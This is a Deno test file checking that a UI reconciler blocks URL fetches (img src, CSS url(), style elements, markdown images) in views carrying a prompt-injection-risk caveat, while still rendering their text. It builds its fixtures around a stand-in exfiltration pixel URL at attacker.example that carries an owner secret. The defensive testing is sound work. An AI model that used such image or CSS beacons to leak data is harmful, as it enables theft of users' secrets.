import { assertEquals } from "@std/assert";

import type { CfcAtom } from "@commonfabric/api/cfc";
import {
  CFC_ATOM_TYPE,
  CFC_CONCEPT_KIND,
  cfcAtom,
} from "@commonfabric/api/cfc";
import { Identity } from "@commonfabric/identity";
import { KeepAsCell, Runtime } from "@commonfabric/runner";
import {
  createRenderConfidentialityResolver,
  PROMPT_CAVEAT_FAMILY_KINDS,
} from "@commonfabric/runner/cfc";
import { rendererVDOMSchema } from "@commonfabric/runner/schemas";
import { StorageManager } from "@commonfabric/runner/storage/cache.deno";

import {
  SEED_ENVELOPE_SCHEMA_HASH,
  seedStoredEnvelope,
  writeSeedEnvelopeDoc,
} from "../../runner/test/cfc-seed-envelope.ts";
import type { VDomOp } from "../src/vdom-ops.ts";
import { WorkerReconciler } from "../src/worker/reconciler.ts";

// The default display ceiling admits the prompt-caveat family (SC-54), so
// text carrying an injection-risk caveat renders for its owner. A render that
// FETCHES a URL is network egress, not display: before the family was
// admitted, a value carrying a material-risk caveat never rendered, so it
// never fetched. These pin that a URL fetch keeps that older ceiling while the
// text around it renders. The op stream is asserted, not the final DOM: a
// `set-prop src` later removed has already started the fetch.

function createOpsCollector() {
  const allOps: VDomOp[] = [];
  return {
    onOps: (ops: VDomOp[]) => {
      for (const op of ops) allOps.push(op);
    },
    clear: () => {
      allOps.length = 0;
    },
    all: () => [...allOps],
  };
}

const ATTACKER_URL = "https://attacker.example/pixel?d=owner-secret";

function setProps(ops: readonly VDomOp[], key: string): unknown[] {
  return ops.flatMap((op) =>
    op.op === "set-prop" && op.key === key ? [op.value] : []
  );
}

function bindings(ops: readonly VDomOp[], propName: string): number {
  return ops.filter((op) => op.op === "set-binding" && op.propName === propName)
    .length;
}

function texts(ops: readonly VDomOp[]): string[] {
  return ops.flatMap((op) => op.op === "create-text" ? [op.text] : []);
}

Deno.test("render-time URL fetches keep the pre-family ceiling", async (t) => {
  const signer = await Identity.fromPassphrase(
    "worker reconciler remote loads",
  );
  const owner = signer.did();
  const storageManager = StorageManager.emulate({ as: signer });
  const runtime = new Runtime({
    storageManager,
    apiUrl: new URL("http://localhost"),
  });
  const caveat = (kind: string): CfcAtom => ({
    type: CFC_ATOM_TYPE.Caveat,
    kind,
    source: "of:untrusted-sender",
  });
  const unscreened = caveat(CFC_CONCEPT_KIND.PromptInjectionRiskUnscreened);

  // The production ceiling lib-shell builds, and its resolver.
  const ceiling = {
    atoms: [cfcAtom.user(owner), cfcAtom.personalSpace(owner), owner],
    caveatKinds: [...PROMPT_CAVEAT_FAMILY_KINDS],
  };
  const reconcilerFor = (
    onOps: (ops: VDomOp[]) => void,
    withCeiling = true,
  ) =>
    new WorkerReconciler({
      onOps,
      ...(withCeiling
        ? {
          renderConfidentialityCeiling: ceiling,
          resolveRenderConfidentiality: createRenderConfidentialityResolver({
            actingPrincipal: owner,
            memberSpaces: [owner],
          }),
        }
        : {}),
    });

  let seq = 0;
  /** Seeds a document holding `value`, labelled as a whole. */
  const seed = async (
    value: unknown,
    confidentiality: readonly CfcAtom[],
    id = `remote-loads-${++seq}`,
  ) => {
    const tx = runtime.edit();
    const cell = runtime.getCell(owner, id, undefined, tx);
    const link = cell.getAsNormalizedFullLink();
    writeSeedEnvelopeDoc(tx, owner);
    seedStoredEnvelope(tx, {
      space: owner,
      id: link.id!,
      type: "application/json",
      path: [],
    }, {
      value,
      cfc: {
        version: 1,
        schemaHash: SEED_ENVELOPE_SCHEMA_HASH,
        labelMap: {
          version: 1,
          entries: [{ path: [], label: { confidentiality } }],
        },
      },
    });
    assertEquals((await tx.commit()).ok !== undefined, true);
    return id;
  };
  const linkTo = (id: string, path: string[] = []) => {
    let cell = runtime.getCell(owner, id);
    for (const key of path) cell = cell.key(key as never) as typeof cell;
    return cell.getAsLink({ includeSchema: true, keepAsCell: KeepAsCell.All });
  };
  /** Mounts `id` the way the runtime mounts a piece's UI and settles. */
  const render = async (id: string, withCeiling = true) => {
    const collector = createOpsCollector();
    const reconciler = reconcilerFor(collector.onOps, withCeiling);
    const cancel = reconciler.mount(
      runtime.getCell(owner, id).asSchema(rendererVDOMSchema) as never,
    );
    await t.settle();
    return { collector, cancel };
  };

  const pixelView = (extra: Record<string, unknown> = {}) => ({
    type: "vnode",
    name: "div",
    props: { style: "color: red" },
    children: [
      { type: "vnode", name: "span", props: {}, children: ["Owner text"] },
      {
        type: "vnode",
        name: "img",
        props: { src: ATTACKER_URL, alt: "pixel", ...extra },
        children: [],
      },
    ],
  });

  // Every material-risk tier, in both spellings, keeps a URL from fetching.
  for (
    const kind of [
      CFC_CONCEPT_KIND.PromptInjectionRiskUnscreened,
      CFC_CONCEPT_KIND.PromptInjectionRiskIngressScreened,
      CFC_CONCEPT_KIND.PromptInjectionRiskValueScreened,
      "prompt-injection-risk-unscreened",
      "prompt-injection-risk-ingress-screened",
      "prompt-injection-risk-value-screened",
    ]
  ) {
    await t.step(`a view under ${kind} renders its text, never its src`, async () => {
      const id = await seed(pixelView(), [owner, caveat(kind)]);
      const { collector, cancel } = await render(id);
      try {
        const ops = collector.all();
        assertEquals(texts(ops).includes("Owner text"), true);
        assertEquals(setProps(ops, "src"), []);
        // A prop that fetches nothing still applies, styling included.
        assertEquals(setProps(ops, "alt").includes("pixel"), true);
        assertEquals(setProps(ops, "style").includes("color: red"), true);
      } finally {
        cancel();
      }
    });
  }

  await t.step("prompt influence keeps fetching, as before the family", async () => {
    const id = await seed(pixelView(), [
      owner,
      caveat(CFC_CONCEPT_KIND.PromptInfluence),
    ]);
    const { collector, cancel } = await render(id);
    try {
      assertEquals(setProps(collector.all(), "src"), [ATTACKER_URL]);
    } finally {
      cancel();
    }
  });

  await t.step("the owner's own uncaveated image fetches", async () => {
    const id = await seed(pixelView(), [owner]);
    const { collector, cancel } = await render(id);
    try {
      assertEquals(setProps(collector.all(), "src"), [ATTACKER_URL]);
    } finally {
      cancel();
    }
  });

  await t.step("with no ceiling configured nothing is gated", async () => {
    const id = await seed(pixelView(), [owner, unscreened]);
    const { collector, cancel } = await render(id, false);
    try {
      assertEquals(setProps(collector.all(), "src"), [ATTACKER_URL]);
    } finally {
      cancel();
    }
  });

  await t.step("a style that can name a URL is refused; one that cannot applies", async () => {
    const id = await seed({
      type: "vnode",
      name: "div",
      props: {},
      children: [
        {
          type: "vnode",
          name: "p",
          props: { style: `background-image: url(${ATTACKER_URL})` },
          children: ["Fetching style"],
        },
        {
          type: "vnode",
          name: "p",
          props: { style: "font-weight: bold" },
          children: ["Plain style"],
        },
      ],
    }, [owner, unscreened]);
    const { collector, cancel } = await render(id);
    try {
      const styles = setProps(collector.all(), "style");
      assertEquals(styles.includes("font-weight: bold"), true);
      assertEquals(
        styles.some((style) => String(style).includes("url(")),
        false,
      );
    } finally {
      cancel();
    }
  });

  await t.step("an upper-case tag is the same element", async () => {
    const id = await seed({
      type: "vnode",
      name: "IMG",
      props: { SRC: ATTACKER_URL },
      children: [],
    }, [owner, unscreened]);
    const { collector, cancel } = await render(id);
    try {
      assertEquals(setProps(collector.all(), "SRC"), []);
    } finally {
      cancel();
    }
  });

  await t.step("a <style> element's text does not render under the caveat", async () => {
    const css = `body { background: url(${ATTACKER_URL}) }`;
    const id = await seed({
      type: "vnode",
      name: "div",
      props: {},
      children: [
        { type: "vnode", name: "style", props: {}, children: [css] },
        "Visible text",
      ],
    }, [owner, unscreened]);
    const { collector, cancel } = await render(id);
    try {
      const rendered = texts(collector.all());
      assertEquals(rendered.includes("Visible text"), true);
      assertEquals(rendered.includes(css), false);
    } finally {
      cancel();
    }
  });

  await t.step("a render boundary inside the view keeps the fetch refused", async () => {
    const id = await seed({
      type: "vnode",
      name: "cf-cfc-render-boundary",
      props: {},
      children: [{
        type: "vnode",
        name: "img",
        props: { src: ATTACKER_URL },
        children: [],
      }],
    }, [owner, unscreened]);
    const { collector, cancel } = await render(id);
    try {
      assertEquals(setProps(collector.all(), "src"), []);
    } finally {
      cancel();
    }
  });

  await t.step("a src read from a caveated cell is refused; its text renders", async () => {
    const value = await seed(ATTACKER_URL, [owner, unscreened]);
    const id = await seed({
      type: "vnode",
      name: "div",
      props: {},
      children: [
        {
          type: "vnode",
          name: "img",
          props: { src: linkTo(value) },
          children: [],
        },
        linkTo(value),
      ],
    }, [owner]);
    const { collector, cancel } = await render(id);
    try {
      const ops = collector.all();
      assertEquals(texts(ops).includes(ATTACKER_URL), true);
      assertEquals(setProps(ops, "src"), []);
    } finally {
      cancel();
    }
  });

  await t.step("a clean src inside a caveated view is refused too", async () => {
    // The caveated view chose which image to show, so loading even a clean
    // URL tells its host what the view decided.
    const value = await seed("https://images.example/clean.png", [owner]);
    const id = await seed({
      type: "vnode",
      name: "img",
      props: { src: linkTo(value) },
      children: [],
    }, [owner, unscreened]);
    const { collector, cancel } = await render(id);
    try {
      assertEquals(setProps(collector.all(), "src"), []);
    } finally {
      cancel();
    }
  });

  await t.step("markdown content from a caveated cell is refused", async () => {
    const value = await seed(`![x](${ATTACKER_URL})`, [owner, unscreened]);
    const id = await seed({
      type: "vnode",
      name: "cf-markdown",
      props: { content: linkTo(value), $value: linkTo(value) },
      children: [],
    }, [owner]);
    const { collector, cancel } = await render(id);
    try {
      const ops = collector.all();
      assertEquals(setProps(ops, "content"), []);
    } finally {
      cancel();
    }
  });

  await t.step("a markdown binding to a caveated cell is refused", async () => {
    const value = await seed(`![x](${ATTACKER_URL})`, [owner, unscreened]);
    const id = await seed({
      type: "vnode",
      name: "cf-markdown",
      props: { $content: linkTo(value) },
      children: [],
    }, [owner]);
    const { collector, cancel } = await render(id);
    try {
      assertEquals(bindings(collector.all(), "content"), 0);
    } finally {
      cancel();
    }
  });

  await t.step("a view that gains the caveat with the same value stops fetching", async () => {
    const id = "remote-loads-flip";
    await seed(pixelView(), [owner], id);
    const { collector, cancel } = await render(id);
    try {
      assertEquals(setProps(collector.all(), "src"), [ATTACKER_URL]);
      collector.clear();
      await seed(pixelView(), [owner, unscreened], id);
      await t.settle();
      const ops = collector.all();
      assertEquals(setProps(ops, "src"), []);
      // The fetching element is gone or its src removed.
      assertEquals(
        ops.some((op) =>
          op.op === "remove-node" ||
          (op.op === "remove-prop" && op.key === "src")
        ),
        true,
      );
    } finally {
      cancel();
    }
  });
});
